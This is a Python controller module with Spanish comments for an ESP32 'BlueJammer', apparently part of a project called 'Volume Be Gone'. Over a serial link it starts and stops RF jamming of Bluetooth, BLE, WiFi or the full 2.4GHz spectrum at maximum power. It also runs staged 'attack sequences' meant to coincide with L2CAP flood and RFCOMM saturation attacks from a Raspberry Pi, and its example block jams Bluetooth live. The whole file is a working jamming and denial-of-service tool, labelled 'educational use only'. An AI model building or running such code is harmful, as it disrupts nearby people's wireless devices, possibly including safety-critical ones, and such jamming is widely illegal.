#!/usr/bin/env python3
"""
ESP32 Jammer Controller - Volume Be Gone v3.0

Módulo de control para comunicación serial con ESP32-BlueJammer.
Coordina ataques RF desde Raspberry Pi.

Autor: Francisco Ortiz Rojas
Licencia: MIT (Solo para uso educativo)
"""

import serial
import time
import threading
from typing import Optional, List, Callable
from enum import Enum


class JamMode(Enum):
    """Modos de jamming disponibles"""
    IDLE = "IDLE"
    BT = "BT"       # Bluetooth Classic (79 canales)
    BLE = "BLE"     # Bluetooth Low Energy (40 canales)
    WIFI = "WIFI"   # WiFi 2.4GHz (14 canales)
    FULL = "FULL"   # Full spectrum (125 canales)


class TxPattern(Enum):
    """Patrones de transmisión"""
    CONTINUOUS = "CONT"   # Transmisión continua
    PULSE = "PULSE"       # Pulsos 50ms on/off
    SWEEP = "SWEEP"       # Barrido de frecuencia
    BURST = "BURST"       # Ráfagas aleatorias


class PowerLevel(Enum):
    """Niveles de potencia"""
    MAX = "MAX"
    HIGH = "HIGH"
    MED = "MED"
    LOW = "LOW"


class ESP32Controller:
    """
    Controlador para ESP32 Hybrid Jammer.

    Maneja la comunicación serial y coordina ataques RF.
    """

    def __init__(self, port: str = "/dev/ttyUSB0", baudrate: int = 115200, timeout: float = 1.0):
        """
        Inicializa el controlador ESP32.

        Args:
            port: Puerto serial (default: /dev/ttyUSB0)
            baudrate: Velocidad de comunicación (default: 115200)
            timeout: Timeout para lectura serial (default: 1.0s)
        """
        self.port = port
        self.baudrate = baudrate
        self.timeout = timeout
        self.serial: Optional[serial.Serial] = None
        self.connected = False
        self.jamming = False
        self.current_mode = JamMode.IDLE
        self.current_pattern = TxPattern.CONTINUOUS
        self.current_power = PowerLevel.MAX

        # Callbacks para eventos
        self._on_status_change: Optional[Callable] = None
        self._on_error: Optional[Callable] = None

        # Thread para lectura asíncrona
        self._read_thread: Optional[threading.Thread] = None
        self._running = False

    def connect(self) -> bool:
        """
        Conecta con el ESP32.

        Returns:
            True si la conexión fue exitosa, False en caso contrario.
        """
        try:
            self.serial = serial.Serial(
                port=self.port,
                baudrate=self.baudrate,
                timeout=self.timeout,
                bytesize=serial.EIGHTBITS,
                parity=serial.PARITY_NONE,
                stopbits=serial.STOPBITS_ONE
            )

            # Esperar a que el ESP32 se reinicie (si acaba de conectarse)
            time.sleep(2)

            # Limpiar buffer
            self.serial.reset_input_buffer()
            self.serial.reset_output_buffer()

            # Test de conexión
            if self.ping():
                self.connected = True
                print(f"[ESP32] Conectado en {self.port}")
                return True
            else:
                print(f"[ESP32] No responde en {self.port}")
                self.disconnect()
                return False

        except serial.SerialException as e:
            print(f"[ESP32] Error de conexión: {e}")
            return False

    def disconnect(self):
        """Desconecta del ESP32."""
        self._running = False

        if self._read_thread and self._read_thread.is_alive():
            self._read_thread.join(timeout=2)

        if self.serial and self.serial.is_open:
            # Detener jamming antes de desconectar
            if self.jamming:
                self.stop_jamming()
            self.serial.close()

        self.connected = False
        print("[ESP32] Desconectado")

    def _send_command(self, cmd: str) -> Optional[str]:
        """
        Envía un comando y espera respuesta.

        Args:
            cmd: Comando a enviar

        Returns:
            Respuesta del ESP32 o None si hay error
        """
        if not self.serial or not self.serial.is_open:
            return None

        try:
            # Enviar comando
            self.serial.write(f"{cmd}\n".encode())
            self.serial.flush()

            # Esperar respuesta
            response = self.serial.readline().decode().strip()
            return response if response else None

        except serial.SerialException as e:
            print(f"[ESP32] Error enviando comando: {e}")
            if self._on_error:
                self._on_error(str(e))
            return None

    def ping(self) -> bool:
        """
        Test de conexión con ESP32.

        Returns:
            True si responde PONG, False en caso contrario.
        """
        response = self._send_command("PING")
        return response == "PONG"

    def get_status(self) -> Optional[str]:
        """
        Obtiene el estado actual del ESP32.

        Returns:
            String de estado o None si hay error.
        """
        response = self._send_command("STATUS")
        if response and response.startswith("STATUS:"):
            status = response.replace("STATUS:", "")

            # Actualizar estado local
            if status == "IDLE":
                self.jamming = False
                self.current_mode = JamMode.IDLE
            elif status.startswith("JAMMING:"):
                self.jamming = True
                mode_str = status.replace("JAMMING:", "")
                try:
                    self.current_mode = JamMode(mode_str)
                except ValueError:
                    pass

            return status
        return None

    def get_version(self) -> Optional[str]:
        """
        Obtiene la versión del firmware ESP32.

        Returns:
            String de versión o None si hay error.
        """
        response = self._send_command("VERSION")
        if response and response.startswith("VERSION:"):
            return response.replace("VERSION:", "")
        return None

    # ═══════════════════════════════════════════════════════════════════════
    # CONTROL DE JAMMING
    # ═══════════════════════════════════════════════════════════════════════

    def start_jamming(self, mode: JamMode = JamMode.BT) -> bool:
        """
        Inicia el jamming en el modo especificado.

        Args:
            mode: Modo de jamming (BT, BLE, WIFI, FULL)

        Returns:
            True si se inició correctamente.
        """
        # Establecer modo primero
        cmd_map = {
            JamMode.BT: "JAM_BT",
            JamMode.BLE: "JAM_BLE",
            JamMode.WIFI: "JAM_WIFI",
            JamMode.FULL: "JAM_FULL"
        }

        cmd = cmd_map.get(mode, "JAM_BT")
        response = self._send_command(cmd)

        if response and response.startswith("OK:"):
            self.jamming = True
            self.current_mode = mode
            print(f"[ESP32] Jamming iniciado - Modo: {mode.value}")

            if self._on_status_change:
                self._on_status_change(f"JAMMING:{mode.value}")

            return True
        return False

    def stop_jamming(self) -> bool:
        """
        Detiene el jamming.

        Returns:
            True si se detuvo correctamente.
        """
        response = self._send_command("JAM_STOP")

        if response == "OK:JAM_STOPPED":
            self.jamming = False
            self.current_mode = JamMode.IDLE
            print("[ESP32] Jamming detenido")

            if self._on_status_change:
                self._on_status_change("IDLE")

            return True
        return False

    # ═══════════════════════════════════════════════════════════════════════
    # CONFIGURACIÓN DE PATRÓN
    # ═══════════════════════════════════════════════════════════════════════

    def set_pattern(self, pattern: TxPattern) -> bool:
        """
        Establece el patrón de transmisión.

        Args:
            pattern: Patrón (CONTINUOUS, PULSE, SWEEP, BURST)

        Returns:
            True si se configuró correctamente.
        """
        response = self._send_command(f"MODE:{pattern.value}")

        if response and response.startswith("OK:"):
            self.current_pattern = pattern
            print(f"[ESP32] Patrón establecido: {pattern.value}")
            return True
        return False

    def set_power(self, power: PowerLevel) -> bool:
        """
        Establece el nivel de potencia.

        Args:
            power: Nivel (MAX, HIGH, MED, LOW)

        Returns:
            True si se configuró correctamente.
        """
        response = self._send_command(f"POWER:{power.value}")

        if response and response.startswith("OK:"):
            self.current_power = power
            print(f"[ESP32] Potencia establecida: {power.value}")
            return True
        return False

    def set_channels(self, channels: List[int]) -> bool:
        """
        Establece canales específicos para jamming dirigido.

        Args:
            channels: Lista de canales (0-124)

        Returns:
            True si se configuró correctamente.
        """
        # Validar canales
        valid_channels = [ch for ch in channels if 0 <= ch <= 124]
        if not valid_channels:
            return False

        ch_str = ",".join(map(str, valid_channels[:10]))  # Máximo 10 canales
        response = self._send_command(f"CH:{ch_str}")

        return response == "OK:CH_SET"

    # ═══════════════════════════════════════════════════════════════════════
    # SECUENCIAS DE ATAQUE COORDINADO
    # ═══════════════════════════════════════════════════════════════════════

    def attack_sequence_bt(self, duration: int = 30) -> bool:
        """
        Ejecuta secuencia de ataque optimizada para Bluetooth.

        Fases:
        1. Pre-jamming con pulsos (5s)
        2. Jamming continuo (duration-5s)

        Args:
            duration: Duración total en segundos

        Returns:
            True si la secuencia se completó.
        """
        print(f"[ESP32] Iniciando secuencia BT ({duration}s)")

        # Fase 1: Pre-jamming con pulsos
        self.set_pattern(TxPattern.PULSE)
        self.set_power(PowerLevel.MAX)

        if not self.start_jamming(JamMode.BT):
            return False

        time.sleep(5)

        # Fase 2: Jamming continuo
        self.set_pattern(TxPattern.CONTINUOUS)
        time.sleep(duration - 5)

        # Finalizar
        self.stop_jamming()
        print("[ESP32] Secuencia BT completada")
        return True

    def attack_sequence_hybrid(self, pre_jam: int = 5, main_attack: int = 15,
                                rfcomm_phase: int = 10) -> bool:
        """
        Ejecuta secuencia de ataque híbrido coordinado con RPi.

        Esta secuencia está diseñada para sincronizarse con los ataques
        L2CAP/RFCOMM del Raspberry Pi.

        Fases:
        1. Pre-jamming: Cegar dispositivo (pre_jam segundos)
        2. Ataque combinado: Pulsos durante L2CAP (main_attack segundos)
        3. RFCOMM: Continuo durante saturación (rfcomm_phase segundos)

        Args:
            pre_jam: Duración fase pre-jamming
            main_attack: Duración fase de ataque principal
            rfcomm_phase: Duración fase RFCOMM

        Returns:
            True si la secuencia se completó.
        """
        total = pre_jam + main_attack + rfcomm_phase
        print(f"[ESP32] Secuencia híbrida iniciada ({total}s total)")

        # Fase 1: Pre-jamming
        print(f"[ESP32] Fase 1: Pre-jamming ({pre_jam}s)")
        self.set_pattern(TxPattern.PULSE)
        self.set_power(PowerLevel.MAX)

        if not self.start_jamming(JamMode.BT):
            return False
        time.sleep(pre_jam)

        # Fase 2: Ataque combinado (durante L2CAP flood del RPi)
        print(f"[ESP32] Fase 2: Ataque combinado ({main_attack}s)")
        self.set_pattern(TxPattern.BURST)
        time.sleep(main_attack)

        # Fase 3: RFCOMM saturation
        print(f"[ESP32] Fase 3: RFCOMM phase ({rfcomm_phase}s)")
        self.set_pattern(TxPattern.CONTINUOUS)
        time.sleep(rfcomm_phase)

        # Finalizar
        self.stop_jamming()
        print("[ESP32] Secuencia híbrida completada")
        return True

    # ═══════════════════════════════════════════════════════════════════════
    # CALLBACKS
    # ═══════════════════════════════════════════════════════════════════════

    def on_status_change(self, callback: Callable[[str], None]):
        """Registra callback para cambios de estado."""
        self._on_status_change = callback

    def on_error(self, callback: Callable[[str], None]):
        """Registra callback para errores."""
        self._on_error = callback

    # ═══════════════════════════════════════════════════════════════════════
    # CONTEXT MANAGER
    # ═══════════════════════════════════════════════════════════════════════

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.disconnect()
        return False


# ═══════════════════════════════════════════════════════════════════════════
# EJEMPLO DE USO
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=== ESP32 Controller Test ===\n")

    # Usar como context manager
    with ESP32Controller("/dev/ttyUSB0") as esp32:
        if esp32.connected:
            # Obtener información
            version = esp32.get_version()
            print(f"Firmware: {version}")

            status = esp32.get_status()
            print(f"Estado: {status}")

            # Test de jamming corto (5 segundos)
            print("\nIniciando test de jamming (5s)...")
            esp32.set_pattern(TxPattern.PULSE)
            esp32.start_jamming(JamMode.BT)

            for i in range(5, 0, -1):
                print(f"  {i}...")
                time.sleep(1)

            esp32.stop_jamming()
            print("Test completado.")
        else:
            print("No se pudo conectar al ESP32")
            print("Verifica que esté conectado en /dev/ttyUSB0")
